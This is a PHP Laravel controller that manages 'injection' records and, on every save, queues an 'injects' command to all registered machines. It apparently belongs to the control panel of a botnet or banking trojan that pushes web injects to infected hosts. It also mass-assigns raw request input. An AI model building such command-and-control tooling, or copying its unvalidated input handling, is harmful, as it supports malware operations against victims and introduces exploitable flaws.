<?php

namespace App\Http\Controllers;

use App\Models\Command;
use App\Models\Injection;
use App\Models\Machine;
use Illuminate\Http\Request;

class InjectController extends Controller
{
    public function index()
    {
        return view('pages.injects.index');
    }

    public function getItems()
    {
        $items = Injection::all();

        foreach ($items as $item) {
            $item->edit_url = route('injects.info', ['id' => $item->id]);
            $item->remove_url = route('injects.remove', ['id' => $item->id]);
        }

        return datatables($items)->toJson();
    }

    public function getItem($id = null)
    {
        if (!$id) {
            return view('pages.injects.item');
        }

        $item = Injection::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        return view('pages.injects.item', compact('item'));
    }

    public function removeItem($id)
    {
        $item = Injection::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->forceDelete();

        return redirect()->back();
    }

    public function createOrEditItem(Request $r)
    {
        if ($r->post('id')) {
            Injection::where('id', $r->post('id'))->update($r->all());
        } else {
            Injection::create($r->all());
        }

        $machines = Machine::all();

        foreach ($machines as $machine) {
            Command::query()->create([
                'machine_id' => $machine->id,
                'command' => json_encode([
                    'cmd' => 'injects',
                    'uuid' => $machine->uuid,
                    'data' => []
                ])
            ]);
        }

        return redirect()->route('injects');
    }
}
